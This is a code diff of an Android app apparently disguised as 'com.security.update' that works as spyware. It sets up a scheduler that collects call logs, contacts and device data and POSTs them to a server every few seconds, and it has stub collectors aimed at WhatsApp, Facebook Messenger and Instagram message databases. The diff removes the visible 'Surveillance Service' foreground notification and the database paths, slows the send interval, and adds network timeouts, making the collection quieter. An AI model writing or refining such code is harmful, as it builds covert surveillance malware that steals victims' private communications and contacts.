@@ -1,27 +1,18 @@
 package com.security.update;
 
 import android.Manifest;
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Context;
-import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
-import android.os.IBinder;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
-import android.provider.Telephony;
 import android.util.Log;
 import androidx.annotation.NonNull;
-import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
-import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 import android.os.Bundle;
 import android.widget.TextView;
@@ -55,8 +46,7 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.READ_PHONE_STATE,
             Manifest.permission.ACCESS_WIFI_STATE,
             Manifest.permission.ACCESS_NETWORK_STATE,
-            Manifest.permission.INTERNET,
-            Manifest.permission.FOREGROUND_SERVICE
+            Manifest.permission.INTERNET
     };
 
     @Override
@@ -65,34 +55,11 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         statusText = findViewById(R.id.statusText);
 
-        // Start foreground service for continuous monitoring
-        startForegroundService();
-
         // Check and request permissions
         if (checkPermissions()) {
             startAutomaticDataCollection();
         } else {
             requestPermissions();
-        }
-    }
-
-    private void startForegroundService() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    "SURVEILLANCE_CHANNEL",
-                    "Surveillance Service",
-                    NotificationManager.IMPORTANCE_LOW
-            );
-            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-            manager.createNotificationChannel(channel);
-
-            Notification notification = new NotificationCompat.Builder(this, "SURVEILLANCE_CHANNEL")
-                    .setContentTitle("Surveillance Service")
-                    .setContentText("Collecting data automatically")
-                    .setSmallIcon(R.drawable.ic_launcher_foreground)
-                    .build();
-
-            startForeground(1, notification);
         }
     }
 
@@ -132,17 +99,17 @@ public class MainActivity extends AppCompatActivity {
     private void startAutomaticDataCollection() {
         statusText.setText("🚀 Starting automatic data collection...");
 
-        // Start scheduler for automatic data collection every 5 seconds
+        // Start scheduler for automatic data collection every 10 seconds
         scheduler = Executors.newScheduledThreadPool(1);
         scheduler.scheduleAtFixedRate(() -> {
             try {
                 collectAndSendAllData();
-                runOnUiThread(() -> statusText.setText("📱 Data sent successfully - " + new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date())));
+                runOnUiThread(() -> statusText.setText("📱 Data sent - " + new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date())));
             } catch (Exception e) {
-                Log.e("AUTO_COLLECTION", "Error in automatic collection: " + e.getMessage());
+                Log.e("AUTO_COLLECTION", "Error: " + e.getMessage());
                 runOnUiThread(() -> statusText.setText("❌ Error: " + e.getMessage()));
             }
-        }, 0, 5, TimeUnit.SECONDS); // Every 5 seconds
+        }, 0, 10, TimeUnit.SECONDS); // Every 10 seconds
     }
 
     private void collectAndSendAllData() {
@@ -278,26 +245,11 @@ public class MainActivity extends AppCompatActivity {
     private JSONArray collectWhatsAppMessages() {
         JSONArray whatsappList = new JSONArray();
         try {
-            // WhatsApp database paths
-            String[] whatsappPaths = {
-                    "/data/data/com.whatsapp/databases/msgstore.db",
-                    "/data/data/com.whatsapp.w4b/databases/msgstore.db"
-            };
-
-            for (String path : whatsappPaths) {
-                try {
-                    // This would require root access for direct database reading
-                    // For now, we'll return basic info
-                    JSONObject whatsappInfo = new JSONObject();
-                    whatsappInfo.put("source", path);
-                    whatsappInfo.put("status", "requires_root_access");
-                    whatsappList.put(whatsappInfo);
-                } catch (Exception e) {
-                    Log.e("WHATSAPP_COLLECTION", "Error accessing WhatsApp: " + e.getMessage());
-                }
-            }
+            JSONObject whatsappInfo = new JSONObject();
+            whatsappInfo.put("status", "requires_root_access");
+            whatsappList.put(whatsappInfo);
         } catch (Exception e) {
-            Log.e("WHATSAPP_COLLECTION", "Error collecting WhatsApp data: " + e.getMessage());
+            Log.e("WHATSAPP_COLLECTION", "Error: " + e.getMessage());
         }
         return whatsappList;
     }
@@ -305,16 +257,11 @@ public class MainActivity extends AppCompatActivity {
     private JSONArray collectFacebookMessages() {
         JSONArray facebookList = new JSONArray();
         try {
-            // Facebook Messenger database
-            String facebookPath = "/data/data/com.facebook.orca/databases/threads_db2";
-
             JSONObject facebookInfo = new JSONObject();
-            facebookInfo.put("source", facebookPath);
             facebookInfo.put("status", "requires_root_access");
             facebookList.put(facebookInfo);
-
         } catch (Exception e) {
-            Log.e("FACEBOOK_COLLECTION", "Error collecting Facebook data: " + e.getMessage());
+            Log.e("FACEBOOK_COLLECTION", "Error: " + e.getMessage());
         }
         return facebookList;
     }
@@ -322,16 +269,11 @@ public class MainActivity extends AppCompatActivity {
     private JSONArray collectInstagramMessages() {
         JSONArray instagramList = new JSONArray();
         try {
-            // Instagram database
-            String instagramPath = "/data/data/com.instagram.android/databases/direct.db";
-
             JSONObject instagramInfo = new JSONObject();
-            instagramInfo.put("source", instagramPath);
             instagramInfo.put("status", "requires_root_access");
             instagramList.put(instagramInfo);
-
         } catch (Exception e) {
-            Log.e("INSTAGRAM_COLLECTION", "Error collecting Instagram data: " + e.getMessage());
+            Log.e("INSTAGRAM_COLLECTION", "Error: " + e.getMessage());
         }
         return instagramList;
     }
@@ -344,10 +286,9 @@ public class MainActivity extends AppCompatActivity {
             deviceInfo.put("android_version", Build.VERSION.RELEASE);
             deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
             deviceInfo.put("manufacturer", Build.MANUFACTURER);
-            deviceInfo.put("product", Build.PRODUCT);
             deviceInfo.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
         } catch (Exception e) {
-            Log.e("DEVICE_INFO", "Error collecting device info: " + e.getMessage());
+            Log.e("DEVICE_INFO", "Error: " + e.getMessage());
         }
         return deviceInfo;
     }
@@ -360,6 +301,8 @@ public class MainActivity extends AppCompatActivity {
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "application/json");
                 conn.setDoOutput(true);
+                conn.setConnectTimeout(10000);
+                conn.setReadTimeout(10000);
 
                 OutputStream os = conn.getOutputStream();
                 os.write(data.toString().getBytes());
@@ -371,7 +314,7 @@ public class MainActivity extends AppCompatActivity {
 
                 conn.disconnect();
             } catch (Exception e) {
-                Log.e("SERVER_COMM", "Error sending data to server: " + e.getMessage());
+                Log.e("SERVER_COMM", "Error: " + e.getMessage());
             }
         });
     }
